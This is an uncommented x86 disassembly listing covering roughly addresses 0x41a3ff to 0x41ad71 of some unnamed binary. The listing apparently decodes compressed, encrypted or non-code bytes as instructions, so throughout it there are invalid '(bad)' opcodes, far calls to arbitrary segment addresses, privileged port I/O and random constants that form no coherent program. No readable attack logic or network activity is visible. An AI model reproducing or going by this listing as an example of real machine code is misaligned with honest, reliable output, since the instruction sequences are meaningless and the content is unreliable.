  41a3ff:	jno    0x41a3e6
  41a401:	(bad)  
  41a403:	scas   al,BYTE PTR es:[edi]
  41a404:	and    dl,cl
  41a406:	call   0x3e69:0xd3e8a245
  41a40d:	mov    eax,0x1cdba052
  41a412:	and    ebp,edx
  41a414:	sbb    BYTE PTR [eax+edx*8],ch
  41a417:	(bad)  
  41a418:	pop    es
  41a419:	sti    
  41a41a:	loop   0x41a429
  41a41c:	repnz hlt 
  41a41e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a41f:	addr16 xchg ebx,eax
  41a421:	jbe    0x41a3dd
  41a423:	fistp  DWORD PTR [ecx]
  41a425:	or     bh,dl
  41a427:	cmp    cl,BYTE PTR [edx+0x630af7a0]
  41a42d:	lahf   
  41a42e:	in     al,0x4a
  41a430:	jno    0x41a435
  41a432:	cmp    DWORD PTR [edi+0x7d],ebp
  41a435:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a436:	sar    ebp,0x9b
  41a439:	mov    dh,dl
  41a43b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a43c:	add    al,0x13
  41a43e:	cdq    
  41a43f:	push   ecx
  41a440:	bnd jg 0x41a422
  41a443:	dec    edi
  41a444:	loopne 0x41a409
  41a446:	call   0x3f0c:0x8edcd061
  41a44d:	fisubr DWORD PTR [ebx]
  41a44f:	cmp    esp,DWORD PTR [edx+0x65b681b1]
  41a455:	pop    esi
  41a456:	aaa    
  41a457:	(bad)  
  41a458:	cwde   
  41a459:	mov    bh,0x16
  41a45b:	inc    ecx
  41a45c:	loopne 0x41a4ca
  41a45e:	pop    esi
  41a45f:	into   
  41a460:	add    eax,0x28dc4565
  41a465:	les    ebp,FWORD PTR [esi-0x2f]
  41a468:	ror    DWORD PTR [eax+0x36],0x4f
  41a46c:	dec    ebp
  41a46d:	fwait
  41a46e:	out    0xa5,al
  41a470:	jecxz  0x41a46d
  41a472:	mov    eax,ds:0x129fd973
  41a477:	dec    esi
  41a478:	and    BYTE PTR [ecx],0xdb
  41a47b:	add    BYTE PTR [ebp+0x5ebd47ac],al
  41a481:	stc    
  41a482:	(bad)  [eax]
  41a484:	cli    
  41a485:	fisttp WORD PTR [ecx-0x42]
  41a488:	repz aas 
  41a48a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a48b:	xchg   ebp,eax
  41a48c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a48d:	neg    DWORD PTR [edi]
  41a48f:	test   DWORD PTR [eax],0x0
	...
  41a4f1:	add    BYTE PTR [eax],al
  41a4f3:	add    BYTE PTR [edi-0xf0307e],bh
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	or     eax,0xecfc2c2b
  41a505:	push   ss
  41a506:	add    DWORD PTR [eax],eax
  41a508:	add    al,0x1
  41a50a:	add    BYTE PTR [eax],al
  41a50c:	sbb    esp,DWORD PTR [ebx-0x74947e9d]
  41a512:	or     al,0x5
  41a514:	lock push edx
  41a516:	data16 jg 0x41a517
  41a519:	jmp    0xab35:0x64049344
  41a520:	rcr    DWORD PTR [esi+0x6d],1
  41a523:	jne    0x41a564
  41a525:	add    dh,BYTE PTR [eax-0x603fe35]
  41a52b:	push   esi
  41a52c:	pop    esp
  41a52d:	inc    ecx
  41a52e:	mov    ch,0xa1
  41a530:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a531:	lock sbb DWORD PTR [ecx-0x22],ecx
  41a535:	mov    al,0xeb
  41a537:	aad    0xb1
  41a539:	xor    DWORD PTR [ebx],ecx
  41a53b:	cmp    dh,al
  41a53d:	mov    edx,0xb6a87bbb
  41a542:	lea    edi,[ebx+0x1d]
  41a545:	add    DWORD PTR [eax+edx*4+0x9],esi
  41a549:	sub    BYTE PTR [edx+0x381e7b37],al
  41a54f:	mov    al,ds:0x5b3c4858
  41a554:	in     eax,0xae
  41a556:	cmp    eax,0xcd2d42b1
  41a55b:	mov    dh,0xc1
  41a55d:	and    eax,0x6bdcd070
  41a562:	and    eax,0x9b67bc5b
  41a567:	imul   ebp,DWORD PTR [ecx-0x20fb18fa],0x68
  41a56e:	fwait
  41a56f:	shl    BYTE PTR ds:[edi+0xc],1
  41a573:	push   esp
  41a574:	mov    bl,0x6f
  41a576:	addr16 jae 0x41a5d6
  41a579:	ret    0xc398
  41a57c:	addr16 mov ebx,0xb63303df
  41a582:	xor    al,0x19
  41a584:	loope  0x41a53e
  41a586:	xlat   BYTE PTR ds:[ebx]
  41a587:	push   ecx
  41a588:	and    al,BYTE PTR [esi]
  41a58a:	fwait
  41a58b:	out    0x1,eax
  41a58d:	loop   0x41a5d4
  41a58f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a590:	aam    0xe1
  41a592:	pop    ebp
  41a593:	inc    ecx
  41a594:	call   0x662c469f
  41a599:	cmp    cl,BYTE PTR [ecx+ecx*1+0x37ba475a]
  41a5a0:	xchg   ebp,eax
  41a5a1:	dec    DWORD PTR es:[ebx+0x3d]
  41a5a5:	mov    ch,0xc7
  41a5a7:	jge    0x41a5af
  41a5a9:	mov    bl,0x3c
  41a5ab:	push   esi
  41a5ac:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41a5ae:	sub    al,0x67
  41a5b0:	jns    0x41a569
  41a5b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5b3:	iret   
  41a5b4:	adc    esp,DWORD PTR [ecx+0x7acf3fd0]
  41a5ba:	jp     0x41a57d
  41a5bc:	nop
  41a5bd:	fmul   QWORD PTR [esi+0x3c]
  41a5c0:	jb     0x41a56e
  41a5c2:	sub    ebp,edi
  41a5c4:	xor    dl,BYTE PTR ds:0xc2c344ef
  41a5ca:	jno    0x41a5ca
  41a5cc:	or     ah,BYTE PTR [ebp-0x1c]
  41a5cf:	stos   BYTE PTR es:[edi],al
  41a5d0:	push   ebx
  41a5d1:	cmp    ebp,DWORD PTR [edi-0x46]
  41a5d4:	mov    esp,edx
  41a5d6:	sbb    eax,0x28a6c82e
  41a5db:	in     eax,0x92
  41a5dd:	jae    0x41a637
  41a5df:	int    0xfd
  41a5e1:	mov    ebx,0xa662ec76
  41a5e6:	sbb    edi,ecx
  41a5e8:	mov    ah,0x38
  41a5ea:	jne    0x41a652
  41a5ec:	out    0x31,eax
  41a5ee:	push   esi
  41a5ef:	mov    WORD PTR [ebx-0x7ff00ede],ss
  41a5f5:	(bad)  
  41a5f6:	mov    ds:0xc32a55a1,eax
  41a5fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5fc:	mov    edi,0xf33f7558
  41a601:	or     DWORD PTR [edx],ebx
  41a603:	mov    eax,ds:0xa424ff29
  41a608:	cmp    bl,BYTE PTR [eax+eax*8+0x43]
  41a60c:	ins    BYTE PTR es:[edi],dx
  41a60d:	mov    ch,0x8a
  41a60f:	and    al,0x0
	...
  41a671:	add    BYTE PTR [eax],al
  41a673:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0x3f45a625
  41a682:	loopne 0x41a68e
  41a684:	lock pop ss
  41a686:	add    DWORD PTR [eax],eax
  41a688:	add    al,0x1
  41a68a:	add    BYTE PTR [eax],al
  41a68c:	xchg   edi,eax
  41a68d:	mov    eax,0x3706fd34
  41a692:	int    0x53
  41a694:	lods   eax,DWORD PTR ds:[esi]
  41a695:	ror    BYTE PTR [edi-0x4f],1
  41a698:	or     BYTE PTR [ebx+0x2f30c88d],0xdc
  41a69f:	mov    al,0xb9
  41a6a1:	mov    edx,0x44d68375
  41a6a6:	xchg   ebx,eax
  41a6a7:	adc    edx,esp
  41a6a9:	jg     0x41a713
  41a6ab:	push   edi
  41a6ac:	jmp    0x81a0:0x5b6a8e5e
  41a6b3:	adc    al,0xd5
  41a6b5:	pop    esi
  41a6b6:	fisub  WORD PTR [esi+0x9]
  41a6b9:	xor    bh,BYTE PTR [ecx-0x758adffd]
  41a6bf:	ins    BYTE PTR es:[edi],dx
  41a6c0:	loop   0x41a714
  41a6c2:	cmp    ecx,0xffffffeb
  41a6c5:	aad    0x6f
  41a6c7:	jmp    0x3cae405d
  41a6cc:	int3   
  41a6cd:	loope  0x41a71f
  41a6cf:	fs dec eax
  41a6d1:	push   ds
  41a6d2:	test   ebx,ecx
  41a6d4:	and    BYTE PTR [ebx],cl
  41a6d6:	mov    ds:0xdc4d083,al
  41a6db:	enter  0x149b,0xdb
  41a6df:	out    0xae,eax
  41a6e1:	inc    ebx
  41a6e2:	loop   0x41a725
  41a6e4:	mov    dh,0x8a
  41a6e6:	and    al,0x77
  41a6e8:	add    DWORD PTR [edi-0x1b],ebp
  41a6eb:	xchg   ebp,eax
  41a6ec:	or     ebp,edi
  41a6ee:	addr16 cli 
  41a6f0:	ficomp DWORD PTR [edx-0x68e58ba9]
  41a6f6:	mov    ecx,0x89d33912
  41a6fb:	mov    esi,DWORD PTR [edx]
  41a6fd:	dec    eax
  41a6fe:	pop    ds
  41a6ff:	in     eax,dx
  41a700:	inc    edi
  41a701:	cwde   
  41a702:	in     al,dx
  41a703:	and    BYTE PTR [ecx],ch
  41a705:	mov    dh,0x8c
  41a707:	and    al,0xdd
  41a709:	sbb    cl,BYTE PTR [ebx+0x59038451]
  41a70f:	lock xor eax,0xf8bd1284
  41a715:	inc    eax
  41a716:	pop    ds
  41a717:	mov    ebx,0xfcd8ad1e
  41a71c:	stos   DWORD PTR es:[edi],eax
  41a71d:	mov    BYTE PTR [edi-0x31d697d9],cl
  41a723:	mov    edi,0xfa6b8e6f
  41a728:	aad    0x98
  41a72a:	xchg   DWORD PTR [eax],ebx
  41a72c:	enter  0xffab,0x5a
  41a730:	push   es
  41a731:	stc    
  41a732:	cwde   
  41a733:	mov    eax,ds:0xb355259c
  41a738:	jmp    esp
  41a73a:	aaa    
  41a73b:	push   eax
  41a73c:	dec    edi
  41a73d:	rcl    DWORD PTR [esi],0xdc
  41a740:	mov    eax,0xedde102f
  41a745:	add    esp,DWORD PTR [esi+0x65]
  41a748:	shl    DWORD PTR [edi],0xbe
  41a74b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a74c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a74d:	clc    
  41a74e:	aaa    
  41a74f:	cmp    ebx,DWORD PTR [ecx+0x52456e68]
  41a755:	mov    BYTE PTR [ebx],cl
  41a757:	lahf   
  41a758:	mov    dl,0x4c
  41a75a:	and    bl,cl
  41a75c:	add    esi,0x86f5c577
  41a762:	rcl    DWORD PTR [ebp+0x2b12626d],cl
  41a768:	pop    edx
  41a769:	adc    BYTE PTR [edi+0x6c5779dc],al
  41a76f:	(bad)  
  41a770:	mov    ch,0x8
  41a772:	call   0xd79d8fd1
  41a777:	cmp    dl,BYTE PTR [edi]
  41a779:	jmp    0x77e8a3e0
  41a77e:	add    DWORD PTR [esi],ecx
  41a780:	sbb    BYTE PTR ds:0x83e82c71,0x3a
  41a787:	sbb    al,0xfe
  41a789:	and    DWORD PTR [ebx],ebp
  41a78b:	js     0x41a7b9
  41a78d:	mov    dl,0x60
  41a78f:	jae    0x41a791
	...
  41a7f1:	add    BYTE PTR [eax],al
  41a7f3:	add    bl,dh
  41a7f5:	xchg   edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0xbf5327ca,al
  41a801:	shl    DWORD PTR [ebx],cl
  41a803:	lods   al,BYTE PTR ds:[esi]
  41a804:	hlt    
  41a805:	sbb    BYTE PTR [ecx],al
  41a807:	add    BYTE PTR [ecx+eax*1],al
  41a80a:	add    BYTE PTR [eax],al
  41a80c:	call   0x12854de3
  41a811:	out    dx,eax
  41a812:	mov    cl,0x22
  41a814:	aad    0x1a
  41a816:	iret   
  41a817:	test   esi,eax
  41a819:	add    ecx,DWORD PTR [ebx+0x1a4de59f]
  41a81f:	fsubr  st,st(1)
  41a821:	ins    BYTE PTR es:[edi],dx
  41a822:	(bad)  
  41a824:	shr    BYTE PTR [ebp+0x50],1
  41a827:	adc    ecx,DWORD PTR [edi]
  41a829:	jae    0x41a7ac
  41a82b:	jne    0x41a819
  41a82d:	mov    ecx,0x3aeeb065
  41a832:	adc    ah,BYTE PTR [eax-0x7c979c56]
  41a838:	out    dx,al
  41a839:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a83a:	dec    edx
  41a83b:	enter  0x801c,0xbd
  41a83f:	jmp    0x41a825
  41a841:	push   esi
  41a842:	ret    
  41a843:	stos   BYTE PTR es:[edi],al
  41a844:	add    BYTE PTR [edx+0x3359f9ca],cl
  41a84a:	push   es
  41a84b:	iret   
  41a84c:	sub    bh,BYTE PTR ds:0x4ef713a0
  41a852:	pusha  
  41a853:	cmp    bl,al
  41a855:	pop    eax
  41a856:	jp     0x41a8ce
  41a858:	pop    esi
  41a859:	and    cl,bh
  41a85b:	inc    esi
  41a85c:	inc    ecx
  41a85d:	or     eax,0x693b835f
  41a862:	mov    ebp,0x8eba3776
  41a867:	or     eax,DWORD PTR [eax+esi*1]
  41a86a:	cmp    dh,BYTE PTR [eax-0x6babd07a]
  41a870:	scas   eax,DWORD PTR es:[edi]
  41a871:	lahf   
  41a872:	cmp    BYTE PTR [ecx+esi*1+0x10],ah
  41a876:	inc    esp
  41a877:	dec    ebx
  41a878:	sbb    ah,BYTE PTR [ecx+0x5c]
  41a87b:	sub    eax,0xdc2a8699
  41a880:	push   es
  41a881:	jbe    0x41a83b
  41a883:	add    DWORD PTR [eax-0x1b],edi
  41a886:	push   esi
  41a887:	xchg   esp,eax
  41a888:	xchg   esi,eax
  41a889:	(bad)  
  41a88a:	sti    
  41a88b:	aas    
  41a88c:	jge    0x41a90d
  41a88e:	arpl   ax,dx
  41a890:	int3   
  41a891:	fiadd  WORD PTR [ebp+0x4d8b9f76]
  41a897:	sub    eax,0x5e7702b4
  41a89c:	xor    al,0x5e
  41a89e:	inc    edx
  41a89f:	pop    ss
  41a8a0:	(bad)  
  41a8a1:	aam    0xcb
  41a8a3:	cmc    
  41a8a4:	mov    eax,0xe2540933
  41a8a9:	pop    ecx
  41a8aa:	dec    ebp
  41a8ab:	bound  eax,QWORD PTR [ebx-0x1bccdc63]
  41a8b1:	xchg   BYTE PTR [ecx],al
  41a8b3:	es pop ebp
  41a8b5:	adc    DWORD PTR [esi-0x7a],edi
  41a8b8:	dec    ecx
  41a8b9:	lea    ecx,[edx-0x43a57ce9]
  41a8bf:	(bad)
  41a8c2:	jle    0x41a8ef
  41a8c4:	in     al,dx
  41a8c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8c6:	scas   eax,DWORD PTR es:[edi]
  41a8c7:	data16 sbb al,0xc0
  41a8ca:	cmp    DWORD PTR [edx],esp
  41a8cc:	adc    ah,BYTE PTR [edi+0x63]
  41a8cf:	jmp    0x334a21d5
  41a8d4:	call   0x69f1afce
  41a8d9:	mov    ds:0xf1bbd51e,eax
  41a8de:	daa    
  41a8df:	lods   eax,DWORD PTR ds:[esi]
  41a8e0:	mov    bh,0x10
  41a8e2:	test   DWORD PTR [eax+0x7f],edx
  41a8e5:	adc    ch,0xf6
  41a8e8:	out    0xf8,al
  41a8ea:	loop   0x41a91b
  41a8ec:	dec    ebx
  41a8ed:	rcl    BYTE PTR ds:0x6c45241b,0x69
  41a8f4:	outs   dx,BYTE PTR ds:[esi]
  41a8f5:	xchg   edi,eax
  41a8f6:	add    BYTE PTR [edx+0xde04e70],dh
  41a8fc:	jg     0x41a964
  41a8fe:	(bad)  
  41a8ff:	push   ds
  41a900:	aad    0x67
  41a902:	int3   
  41a903:	add    DWORD PTR [ecx],edx
  41a905:	ins    DWORD PTR es:[edi],dx
  41a906:	pop    edx
  41a907:	sti    
  41a908:	or     bh,dl
  41a90a:	ins    BYTE PTR es:[edi],dx
  41a90b:	fmul   QWORD PTR [ebp+0x29e6f3]
	...
  41a971:	add    BYTE PTR [eax],al
  41a973:	add    BYTE PTR ds:0xcf4a867e,dh
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	and    DWORD PTR [edi+0x19f89ed7],edx
  41a986:	add    DWORD PTR [eax],eax
  41a988:	add    al,0x1
  41a98a:	add    BYTE PTR [eax],al
  41a98c:	pop    ds
  41a98d:	stos   DWORD PTR es:[edi],eax
  41a98e:	xchg   BYTE PTR [ebp+0x66169054],ch
  41a994:	pop    edx
  41a995:	mov    ebx,0x2404759c
  41a99a:	mov    fs,WORD PTR [ecx+eiz*2]
  41a99d:	aad    0xf8
  41a99f:	mov    ah,0xe6
  41a9a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9a2:	je     0x41a962
  41a9a4:	sub    DWORD PTR [ebx-0x5],esp
  41a9a7:	jne    0x41a94a
  41a9a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9aa:	sbb    esp,DWORD PTR [ebx+edx*8]
  41a9ad:	ins    BYTE PTR es:[edi],dx
  41a9ae:	and    ebx,esi
  41a9b0:	mov    esi,0x7bd4c133
  41a9b5:	lds    ebp,FWORD PTR [edi+ecx*1+0x39bc9731]
  41a9bc:	mov    eax,0xab03c26c
  41a9c1:	pop    es
  41a9c2:	aaa    
  41a9c3:	aad    0xc3
  41a9c5:	and    al,0x7c
  41a9c7:	cmp    bh,BYTE PTR [ebx-0x29]
  41a9ca:	inc    edi
  41a9cb:	js     0x41a9e1
  41a9cd:	stos   BYTE PTR es:[edi],al
  41a9ce:	pop    ds
  41a9cf:	mov    ?,edi
  41a9d1:	pop    es
  41a9d2:	addr16 retf 
  41a9d4:	in     eax,dx
  41a9d5:	repz (bad) [esi]
  41a9d8:	sti    
  41a9d9:	nop
  41a9da:	fdiv   QWORD PTR [eax+eax*1]
  41a9dd:	xlat   BYTE PTR ds:[ebx]
  41a9de:	adc    esp,edi
  41a9e0:	repz and eax,0xa165a719
  41a9e6:	mov    WORD PTR [ebp+0x52],ds
  41a9e9:	push   esp
  41a9ea:	lea    edx,[ebx+0x1d]
  41a9ed:	add    eax,0x7c1c73d1
  41a9f2:	(bad)  
  41a9f3:	push   edx
  41a9f4:	loop   0x41a9c6
  41a9f6:	rcr    BYTE PTR [eax+0xd],0xf9
  41a9fa:	js     0x41a97c
  41a9fc:	call   0x6ae8:0x53a8c4a
  41aa03:	das    
  41aa04:	addr16 add ecx,eax
  41aa07:	leave  
  41aa08:	fld    TBYTE PTR [ecx+0x3515fd6]
  41aa0e:	shl    DWORD PTR [edx+0x2e],0x2e
  41aa12:	sahf   
  41aa13:	adc    eax,0x487b5ebe
  41aa18:	pusha  
  41aa19:	push   ecx
  41aa1a:	cmp    eax,0xcfca7956
  41aa1f:	daa    
  41aa20:	mov    esi,0xc3a5512f
  41aa25:	and    eax,0x3bb7f7fd
  41aa2a:	test   BYTE PTR [eax+ebp*1],ch
  41aa2d:	push   ds
  41aa2e:	cs pop esi
  41aa30:	xchg   esp,eax
  41aa31:	or     al,0xc4
  41aa33:	xor    edx,DWORD PTR [ebx+0x42275637]
  41aa39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa3a:	inc    ebx
  41aa3b:	mov    ecx,0x7c7021f
  41aa40:	mov    WORD PTR [edi-0x10],ss
  41aa43:	cs pushf 
  41aa45:	(bad)
  41aa48:	(bad)  
  41aa49:	pop    edx
  41aa4a:	mov    edx,0x69da0225
  41aa4f:	dec    ebp
  41aa50:	pop    ebp
  41aa51:	cmp    DWORD PTR [ebx+edi*4],edx
  41aa54:	fdivr  QWORD PTR [ebp-0x5f8116f6]
  41aa5a:	in     eax,dx
  41aa5b:	push   edi
  41aa5c:	in     al,0xf7
  41aa5e:	dec    edi
  41aa5f:	cmc    
  41aa60:	jl     0x41aa2b
  41aa62:	jb     0x41aa67
  41aa64:	test   al,0x50
  41aa66:	rol    BYTE PTR [esi],cl
  41aa68:	push   ss
  41aa69:	fsub   QWORD PTR [ecx-0x75ae1577]
  41aa6f:	lds    ecx,FWORD PTR [ebx]
  41aa71:	mov    al,0xc7
  41aa73:	or     al,0xcd
  41aa75:	sbb    al,0x39
  41aa77:	fstp   st(0)
  41aa79:	dec    edx
  41aa7b:	sbb    edi,ebx
  41aa7d:	aas    
  41aa7e:	ror    esi,1
  41aa80:	into   
  41aa81:	sub    DWORD PTR [edi+0x1b2e0387],ebx
  41aa87:	push   esi
  41aa88:	push   ecx
  41aa89:	lods   eax,DWORD PTR ds:[esi]
  41aa8a:	movhps QWORD PTR [ebx-0x1],xmm5
  41aa8e:	jmp    0x41ab0d
	...
  41aaf4:	test   DWORD PTR [ecx],0xfdfeb4dc
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	clc    
  41ab01:	mov    BYTE PTR [edx+0x11afc66],cl
  41ab07:	add    BYTE PTR [ecx+eax*1],al
  41ab0a:	add    BYTE PTR [eax],al
  41ab0c:	pop    eax
  41ab0d:	ret    0x7dbd
  41ab10:	daa    
  41ab11:	mov    dl,BYTE PTR [eax+0x572780b8]
  41ab17:	and    dh,BYTE PTR [edx+ebp*1-0x131431c9]
  41ab1e:	data16 or al,0xc
  41ab21:	fidiv  WORD PTR [esi+eiz*2+0x5022faf1]
  41ab28:	xor    BYTE PTR [esi],ah
  41ab2a:	pushf  
  41ab2b:	ins    DWORD PTR es:[edi],dx
  41ab2c:	mov    fs,esp
  41ab2e:	ffree  st(1)
  41ab30:	mov    esp,0xa155006b
  41ab35:	retf   
  41ab36:	into   
  41ab37:	dec    ebx
  41ab38:	xchg   esi,eax
  41ab39:	xchg   edi,eax
  41ab3a:	jmp    0x41ab3c
  41ab3c:	int    0x18
  41ab3e:	imul   ebx,DWORD PTR [edi-0x25],0x3b
  41ab42:	arpl   WORD PTR [edi],bp
  41ab44:	push   ds
  41ab45:	mov    edx,0x3ffc5949
  41ab4a:	js     0x41aba1
  41ab4c:	outs   dx,BYTE PTR ds:[esi]
  41ab4d:	call   0xb07c:0x711780e9
  41ab54:	hlt    
  41ab55:	inc    edx
  41ab56:	jb     0x41ab30
  41ab58:	mov    edx,ds
  41ab5a:	aad    0xd6
  41ab5c:	inc    ebp
  41ab5d:	jno    0x41ab96
  41ab5f:	stos   BYTE PTR es:[edi],al
  41ab60:	inc    esp
  41ab61:	nop
  41ab62:	pop    esi
  41ab63:	sub    DWORD PTR [esi],0x26
  41ab66:	ret    0x9021
  41ab69:	mov    cl,BYTE PTR [esp+ebx*1+0x77]
  41ab6d:	mov    dl,0xc3
  41ab6f:	clc    
  41ab70:	add    ebp,edx
  41ab72:	(bad)  
  41ab74:	mov    cl,BYTE PTR [ebx-0xc4a7ec9]
  41ab7a:	(bad)  
  41ab7b:	cmp    BYTE PTR [edi-0x73],ch
  41ab7e:	out    0xde,al
  41ab80:	and    bl,BYTE PTR [edx+edi*2-0x1f]
  41ab84:	sbb    BYTE PTR [ebx-0x1a44498],0x7c
  41ab8b:	jl     0x41ac02
  41ab8d:	mov    bh,0x30
  41ab8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab90:	fwait
  41ab91:	mov    ah,BYTE PTR [edi+0x6e]
  41ab94:	inc    ecx
  41ab95:	ret    
  41ab96:	sbb    al,0xf4
  41ab98:	fcom   QWORD PTR [esi-0x622abb28]
  41ab9e:	sub    DWORD PTR [ecx],esi
  41aba0:	mov    WORD PTR [ecx],?
  41aba2:	fild   QWORD PTR [esi]
  41aba4:	nop
  41aba5:	outs   dx,BYTE PTR ds:[esi]
  41aba6:	pmulhuw mm4,QWORD PTR [eax+0x127de42d]
  41abad:	inc    eax
  41abae:	fdiv   QWORD PTR [ebx]
  41abb0:	mov    eax,ds:0xdac34495
  41abb5:	(bad)  [edi+ecx*1]
  41abb8:	mov    edi,DWORD PTR [ecx-0x60]
  41abbb:	or     ecx,DWORD PTR [eax]
  41abbd:	ins    BYTE PTR es:[edi],dx
  41abbe:	jl     0x41aba6
  41abc0:	js     0x41abfb
  41abc2:	aas    
  41abc3:	xchg   ebx,eax
  41abc4:	pop    ecx
  41abc5:	cli    
  41abc6:	mov    cl,bl
  41abc8:	jbe    0x41ac23
  41abca:	retf   
  41abcb:	stc    
  41abcc:	xchg   edi,eax
  41abcd:	or     edx,DWORD PTR [edi]
  41abcf:	xor    ebp,DWORD PTR [ecx+0x49]
  41abd2:	stos   BYTE PTR es:[edi],al
  41abd3:	aaa    
  41abd4:	dec    edx
  41abd5:	xchg   esi,eax
  41abd6:	std    
  41abd7:	fcom   DWORD PTR [edi+0x75]
  41abda:	sub    ebx,ecx
  41abdc:	ins    DWORD PTR es:[edi],dx
  41abdd:	cdq    
  41abde:	xchg   edi,eax
  41abdf:	adc    eax,0x3504ed95
  41abe4:	aaa    
  41abe5:	arpl   WORD PTR [eax+edx*1-0x53],bx
  41abe9:	ins    DWORD PTR es:[edi],dx
  41abea:	jge    0x41abc7
  41abec:	mov    al,ds:0xa5f50fa7
  41abf1:	test   BYTE PTR [edi-0x46],dl
  41abf4:	cld    
  41abf5:	ret    
  41abf6:	pop    edi
  41abf7:	mov    DWORD PTR [ebx-0x37923b8e],edi
  41abfd:	mov    al,ds:0x20a012e
  41ac02:	mov    esp,DWORD PTR [eax]
  41ac04:	iret   
  41ac05:	push   ss
  41ac06:	imul   ebx,eax,0x25
  41ac09:	xor    dh,bh
  41ac0b:	or     dl,BYTE PTR [eax]
  41ac0d:	mov    bl,0xe6
  41ac0f:	call   0x0:0x0
	...
  41ac72:	add    BYTE PTR [eax],al
  41ac74:	push   0x49
  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [ecx+eax*2+0x13]
  41ac82:	fxsave [eax]
  41ac85:	sbb    al,0x1
  41ac87:	add    BYTE PTR [ecx+eax*1],al
  41ac8a:	add    BYTE PTR [eax],al
  41ac8c:	jbe    0x41ac23
  41ac8e:	or     eax,0x6b367847
  41ac93:	cs cld 
  41ac95:	cmp    al,0x80
  41ac97:	jmp    0x41aca0
  41ac99:	hlt    
  41ac9a:	cld    
  41ac9b:	in     eax,0x5b
  41ac9d:	rcl    DWORD PTR [edi+ebp*8-0x1366d543],0x94
  41aca5:	adc    DWORD PTR [ecx],ebp
  41aca7:	adc    DWORD PTR [ebp+0x78],edi
  41acaa:	and    edx,DWORD PTR [ebp-0x1cce9b7c]
  41acb0:	pop    ecx
  41acb2:	fldcw  WORD PTR [esi]
  41acb4:	xchg   esi,eax
  41acb5:	jp     0x41ac7e
  41acb7:	sub    DWORD PTR [ebx+0x32704a71],esi
  41acbd:	sub    BYTE PTR [ebx+edx*8],0x4
  41acc1:	pop    edx
  41acc2:	pop    edi
  41acc3:	icebp  
  41acc4:	popf   
  41acc5:	imul   eax,esi,0xffffffc3
  41acc8:	outs   dx,BYTE PTR ds:[esi]
  41acc9:	pusha  
  41acca:	jae    0x41ad37
  41accc:	std    
  41accd:	cmp    DWORD PTR [ecx-0x145cd868],esp
  41acd3:	mov    edx,0x92ac3e60
  41acd8:	xchg   ecx,eax
  41acd9:	sbb    ah,BYTE PTR [ebx+ecx*2]
  41acdc:	pop    esi
  41acdd:	mov    esi,0x1f80af75
  41ace2:	xor    DWORD PTR [ebx],0xc96bff65
  41ace8:	mov    cl,BYTE PTR [ebx]
  41acea:	jno    0x41ad65
  41acec:	mov    edi,0x9d7b44de
  41acf1:	mov    ch,0xcd
  41acf3:	jne    0x41ad71
  41acf5:	inc    edi
  41acf6:	call   edx
  41acf8:	xchg   esp,eax
  41acf9:	jne    0x41ac96
  41acfb:	pop    eax
  41acfc:	push   ebp
  41acfd:	lock xchg esi,eax
  41acff:	inc    eax
  41ad00:	pop    eax
  41ad01:	mov    ch,0x1c
  41ad03:	adc    eax,0x2a1a4b06
  41ad08:	repz adc BYTE PTR [ecx-0x1],ah
  41ad0c:	jo     0x41ad24
  41ad0e:	inc    edx
  41ad0f:	or     BYTE PTR [esi-0x63],0x70
  41ad13:	sar    DWORD PTR ds:0xf3fa1f9c,1
  41ad19:	push   0x460a74e6
  41ad1e:	ret    
  41ad1f:	push   ds
  41ad20:	cs test eax,0x61464ea
  41ad26:	scas   al,BYTE PTR es:[edi]
  41ad27:	aam    0xc5
  41ad29:	push   ecx
  41ad2a:	fidiv  DWORD PTR [ecx+0x3f]
  41ad2d:	sub    DWORD PTR [ebx-0x3253546],eax
  41ad33:	sbb    bl,BYTE PTR [ebx+esi*8-0x29de90e4]
  41ad3a:	push   es
  41ad3b:	loop   0x41acc2
  41ad3d:	xchg   edx,eax
  41ad3e:	in     al,dx
  41ad3f:	mov    dl,0x38
  41ad41:	jl     0x41ad64
  41ad43:	pop    esi
  41ad44:	scas   eax,DWORD PTR es:[edi]
  41ad45:	jne    0x41ad09
  41ad47:	sbb    eax,0xde5461b5
  41ad4c:	pop    es
  41ad4d:	sub    ch,BYTE PTR [ecx+ecx*4-0x6ed532f3]
  41ad54:	adc    DWORD PTR [edx],edx
  41ad56:	ret    0x7733
  41ad59:	fstp   TBYTE PTR [edi-0x15]
  41ad5c:	mov    ds:0xd6aaa7f9,al
  41ad61:	xchg   DWORD PTR ds:[ecx*4-0x15530075],ebx
  41ad69:	mov    edx,0x702dddf4
  41ad6e:	out    0xf1,eax
  41ad70:	push   esp
  41ad71:	adc    bh,BYTE PTR [ebp+0x54c326cc]
